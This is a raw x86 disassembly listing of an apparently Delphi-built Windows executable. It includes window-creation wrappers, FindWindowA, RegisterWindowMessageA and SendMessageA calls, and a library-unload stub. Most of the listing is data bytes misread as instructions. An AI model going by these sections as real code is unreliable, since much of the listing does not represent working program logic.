dec ebx
add [ ebx + 0x4425ffc0 ] cl
push ds
dec ebx
add [ ebx + 0x4025ffc0 ] cl
push ds
dec ebx
add [ ebx + 0x3c25ffc0 ] cl
push ds
dec ebx
add [ ebx + 0x3825ffc0 ] cl
push ds
dec ebx
add [ ebx + 0x3425ffc0 ] cl
push ds
dec ebx
add [ ebx + 0x3025ffc0 ] cl
push ds
dec ebx
add [ ebx + 0x2c25ffc0 ] cl
push ds
dec ebx
add [ ebx + 0x2825ffc0 ] cl
push ds
dec ebx
add [ ebx + 0x2425ffc0 ] cl
push ds
dec ebx
add [ ebx + 0x2025ffc0 ] cl
push ds
dec ebx
add [ ebx + 0x1c25ffc0 ] cl
push ds
dec ebx
add [ ebx + 0x1825ffc0 ] cl
push ds
dec ebx
add [ ebx + 0x1425ffc0 ] cl
push ds
dec ebx
add [ ebx + 0x1025ffc0 ] cl
push ds
dec ebx
add [ ebx + 0xc25ffc0 ] cl
push ds
dec ebx
add [ ebx + 0x825ffc0 ] cl
push ds
dec ebx
add [ ebx + 0x425ffc0 ] cl
push ds
dec ebx
add [ ebx + 0x25ffc0 ] cl
push ds
dec ebx
add [ ebx - 0x3da0040 ] cl
sbb eax 0xc08b004b
jmp [ LeaveCriticalSection@IAT ]
ja RegQueryValueExA
or ch [ edi + 0x64 ]
outsd
dec eax
outsd
je r-xdata
je CloseHandle
jb r-xdata
imul esi [ edi + eax + 0x57 ] 0x6f646e69
dec ecx
outsb
popad
arpl [ ecx + ebp * 2 + 0x76 ] si
or [ gs : edi + 0x64 ] ebp
dec esi
outsd
inc ecx
arpl [ ebx + 0x65 ] sp
insb
or eax 0x6f4e646f
inc esi
outsd
arpl [ ebp + 0x73 ] si
push edx
arpl [ gs : ebx + ecx + 0x6f ] si
push edx
jae RegEnumKeyExA
imul esp [ edi + 0x68 ] 0x646f0a74
je r-xdata
pop ds
dec ebx
xor [ fs : ebx ] ecx
outsd
push edx
jae r-xdata
mov eax eax
nop
test al 0x72
inc eax
add [ esi ] al
andps xmm1 [ edi + 0x77 ]
outsb
jb r-xdata
mov eax eax
add esi esp
jno r-xdata
dec ebx
add [ ebx + 0x425ffc0 ] cl
jb r-xdata
add [ ebx + 0x25ffc0 ] cl
pop ds
dec ebx
add [ ebx - 0x3da0040 ] cl
add [ ebx + 0x1c25ffc0 ] cl
pop ds
dec ebx
add [ ebx + 0x1825ffc0 ] cl
pop ds
dec ebx
add [ ebx + 0x1425ffc0 ] cl
pop ds
dec ebx
add [ ebx + 0x1025ffc0 ] cl
pop ds
dec ebx
push ds
dec ebx
add [ ebx - 0x7da0040 ] cl
push ds
dec ebx
add [ ebx - 0xbda0040 ] cl
push ds
sar bh 0x25
cld
xor cl [ fs : esi ]
outsd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
add [ ebx + 0xc25ffc0 ] cl
pop ds
dec ebx
add [ ebx + 0x825ffc0 ] cl
pop ds
ja r-xdata
imul esi [ fs : edi + eax + 0x57 ] 0x6f646e69
sub_407db8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_403258
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
call CreateWindowExA
mov esi eax
mov eax ebx
call sub_403248
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x24
sub_407e10
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_403258
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
push 0x0
call CreateWindowExA
mov esi eax
mov eax ebx
call sub_403248
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x20
sub_407e68
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
push r-xdata
push r-xdata
call FindWindowA
mov ebx eax
push r-xdata
call RegisterWindowMessageA
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
push r-xdata
call RegisterWindowMessageA
mov [ esi ] eax
push r-xdata
call RegisterWindowMessageA
mov [ edi ] eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
xor edx edx
mov [ eax ] edx
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x3
test ebx ebx
je r-xdata
push 0x0
push 0x0
mov eax [ esi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0xc ]
mov [ edx ] eax
jmp r-xdata
push 0x0
push 0x0
mov eax [ edi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_407f5d
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_407f9b
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_407fa2
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_4082a8
push cs
or dl [ ebx + edx * 2 + 0x65 ]
popad
jb r-xdata
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x4004010 ] dh
add [ eax ] al
add [ ecx ] cl
inc ebp
js r-xdata
push 0x60636552
add [ eax ] eax
add [ ecx ] al
add [ eax ] al
add [ edx + eax * 4 + 0x140040 ] dl
add [ eax ] al
adc [ ebx + 0x40 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ ebx + 0x40 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and al [ ebx + 0xc0040 ]
add [ eax ] al
mov esp 0xac004010
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
mov ah 0x41
inc eax
add ah bh
inc eax
js r-xdata
add [ eax ] al
add ah cl
add [ eax ] 0x10
add [ eax ] al
add ah al
add [ eax ] 0xac
inc ecx
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax - 0x23 ] al
inc eax
add [ edi + edi + 0x40 ] dl
add [ esi ] cl
inc ebp
dec eax
popad
jo r-xdata
imul ebp [ edi + 0x6e ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
js r-xdata
add [ eax ] al
fadd [ eax + eax * 2 + 0x1000 ]
add ah al
add [ eax ] 0xac
inc ecx
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add [ ecx ] cl
inc ebp
inc ebp
js r-xdata
lea eax [ eax ]
test [ eax + eax * 2 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + eax * 4 + 0x100040 ] al
add [ eax ] al
les eax [ edx + 0x41ac0040 ]
jo r-xdata
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add [ esi ] cl
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] ah
add [ eax ] 0xc
add [ eax ] al
add [ eax + edx + 0x41ac0040 ] bh
inc eax
add [ eax + eax ] cl
add [ eax ] al
les eax [ edx + 0x41ac0040 ]
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add [ esi ] al
inc ebp
inc ecx
bound ebp [ edi + 0x72 ]
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + eax * 4 + 0x100040 ] dl
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax * 4 + 0x100040 ] dh
add [ eax ] al
nop
test [ eax ] al
lodsb [ esi ]
inc ebp
jb r-xdata
inc eax
add [ eax - 0x43ffbfbf ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test [ eax + eax * 2 + 0x1000 ] al
add ah al
add [ eax ] 0xac
inc ecx
add [ eax - 0x23 ] al
inc eax
add [ edi + edi + 0x40 ] dl
add [ eax * 2 + 0x4f74754f ] cl
dec bp
insd
outsd
jb r-xdata
imul ebp [ edi + 0x6e ] 0x40842890
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
test [ eax ] al
adc [ eax ] al
add [ eax ] al
add [ ebx + 0x41ac0040 ] 0x40
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] al
push cs
int3
add ah bh
inc eax
jb r-xdata
add [ eax ] al
nop
test [ eax ] al
lodsb [ esi ]
inc ecx
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add [ ecx ] cl
inc ebp
dec ecx
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esp eax
test [ eax ] eax
adc [ eax ] al
popad
insb
mov eax eax
xor al 0x85
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add [ edx ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
jb r-xdata
inc ecx
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al 0x85
inc eax
add [ eax ] dl
add [ eax ] al
add [ eax - 0x53ffbf7c ] dl
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
clc
xchg [ eax ] al
adc [ eax ] al
add [ eax ] al
nop
test [ eax ] al
lodsb [ esi ]
inc ecx
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add [ edx ] cl
inc ebp
dec ebp
popad
je r-xdata
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
xchg [ eax ] al
adc [ eax ] al
add [ eax ] al
dec eax
test [ eax ] eax
lodsb [ esi ]
inc ecx
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
outsd
jb r-xdata
test [ eax ] eax
adc [ eax ] al
add [ eax ] al
dec eax
test [ eax ] eax
lodsb [ esi ]
inc ecx
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insb
inc ebp
js r-xdata
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add [ ebx ] cl
inc ebp
dec ecx
outsb
dec edi
jne r-xdata
test [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test al 0x87
inc eax
add [ eax ] dl
inc ebp
jb r-xdata
inc ebp
inc esp
imul esi [ esi + 0x42 ] 0x72655a79
outsd
nop
inc esp
xchg [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushfd
xchg [ eax ] al
adc [ eax ] al
add [ eax ] al
dec eax
test [ eax ] eax
lodsb [ esi ]
inc ecx
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add [ edx ] dl
inc ebp
inc ebp
js r-xdata
shr ah 0x85
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x78 ] bl
inc eax
add [ eax ] dl
add [ eax ] al
add [ esi + eax * 4 + 0x41ac0040 ] ch
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add [ edx ] cl
inc ebp
push ebp
outsb
jb r-xdata
inc esp
imul esi [ esi + 0x69 ] 0x88006564
inc eax
add [ eax ] al
add [ esi + eax * 4 + 0x41ac0040 ] ch
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x10004087 ] ch
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x79 ] dl
inc eax
add [ eax ] dl
add [ eax ] al
add [ esi + eax * 4 + 0x41ac0040 ] ch
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
imul ebp [ edi + 0x6e ] 0x40859490
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x89
insb
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al 0x88
inc eax
add [ eax ] dl
jb r-xdata
inc eax
add [ edi + edi + 0x40 ] dl
add [ eax * 2 + 0x4f746e49 ] cl
jbe r-xdata
sbb [ edi ] bh
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add [ edx ] cl
inc ebp
dec ecx
outsb
jbe r-xdata
push eax
xchg [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ eax ] al
adc [ eax ] al
add [ eax ] al
lodsb [ esi ]
xchg [ eax ] al
lodsb [ esi ]
inc ecx
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
insb
imul esp [ edi + ecx * 2 + 0x70 ] 0x4087a890
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
xchg [ eax ] eax
adc [ eax ] al
add [ eax ] al
lodsb [ esi ]
xchg [ eax ] al
lodsb [ esi ]
inc ecx
insb
outsd
ja r-xdata
outsb
lea eax [ eax ]
and al 0x8a
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add [ ecx ] cl
inc ebp
dec edi
jbe r-xdata
cld
inc eax
add [ eax ] al
add [ eax - 0x53ffbf7d ] al
inc ecx
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax - 0x23 ] al
inc eax
add [ edi + edi + 0x40 ] dl
add [ edi ] cl
inc ebp
dec ecx
outsb
jbe r-xdata
mov al 0x88
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
jae r-xdata
insb
imul esp [ eax + edx * 2 + 0x6f ] 0x65746e69
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x10004088 ] dh
insb
outsd
ja r-xdata
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add [ ebx ] cl
inc ebp
push edx
popad
outsb
inc ebp
jb r-xdata
add ah bh
inc eax
inc eax
add al bh
xchg [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ecx * 4 ] ah
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
mov [ eax ] eax
adc [ eax ] al
add [ eax ] al
nop
test [ eax ] al
lodsb [ esi ]
inc ecx
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x77 ] ch
inc eax
add [ eax + eax ] cl
add [ eax ] al
les eax [ edx + 0x41ac0040 ]
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add [ 0x6e6f4345 ] cl
jbe r-xdata
lea eax [ eax ]
push 0x4089
inc eax
add [ eax + eax ] cl
add [ eax ] al
les eax [ edx + 0x41ac0040 ]
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ecx * 4 ] cl
mov [ eax ] eax
add [ eax ] al
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add [ ebx ] cl
inc ebp
pop edx
jb r-xdata
rcr [ eax - 0x78 ] 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ecx * 4 + 0xc0040 ] cl
add [ eax ] al
les eax [ edx + 0x41ac0040 ]
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add [ eax ] dl
inc ebp
inc ecx
outsd
insb
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fmul [ edx + 0x100040 ]
add [ eax ] al
nop
test [ eax ] al
lodsb [ esi ]
inc ecx
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
insb
nop
jl r-xdata
inc eax
add [ eax ] dl
add [ eax ] al
add [ eax - 0x53ffbf7c ] dl
inc ecx
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and al 0x8a
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ecx * 4 + 0x40 ] bh
add [ eax ] dl
add [ eax ] al
add [ eax - 0x53ffbf7c ] dl
inc ecx
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add [ esi ] cl
inc ebp
push ebx
je r-xdata
push esi
imul ebp [ edi + 0x6c ] 0x6f697461
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add [ ecx ] cl
inc ebp
inc ebx
outsd
outsb
je r-xdata
inc eax
add ah bh
inc eax
ror [ ebx + ecx * 4 + 0x40 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
add [ edi + edi + 0x40 ] dl
add [ eax ] dl
inc ebp
inc ecx
arpl [ ebx + 0x65 ] sp
jae r-xdata
sbb [ edi ] bh
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add [ eax * 2 + 0x61766e49 ] cl
insb
imul esp [ ebx + eax * 2 + 0x61 ] 0x408d7473
add [ eax - 0x77 ] ch
inc eax
add [ eax ] al
rol ah 0x89
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax eax
xor [ ebx + 0x40 ] cl
add [ eax ] al
add [ eax ] al
arpl [ ebx + 0x4f ] bp
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebx
popad
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
mov [ eax ] es
or al 0x0
add [ eax ] al
les eax [ edx + 0x41ac0040 ]
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
imul ebp [ edi + 0x6e ] 0x6c696146
lea eax [ eax ]
in al dx
mov eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
mov eax [ eax ]
or al 0x0
add [ eax ] al
les eax [ edx + 0x41ac0040 ]
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add [ eax ] al
les eax [ edx + 0x41ac0040 ]
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add [ 0x72615645 ] cl
imul esp [ ecx + 0x6e ] 0x72724574
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
mov eax [ eax ]
or al 0x0
jb r-xdata
add [ ebp - 0x728bffc0 ] cl
inc eax
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
inc ebp
jb r-xdata
outsd
jb r-xdata
arpl [ ebp + eax * 2 + 0x72 ] si
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor [ ebx + 0xc0040 ] cl
insb
outsd
ja r-xdata
in al dx
popad
je r-xdata
je r-xdata
add [ esi ] cl
andps xmm0 [ esi + 0x6f ]
jb r-xdata
imul ebp [ edi + 0x6e ] 0x408d1490
add [ 0x34322e03 ] cl
xor [ eax ] al
add [ eax ] al
mov [ eax ] es
or al 0x0
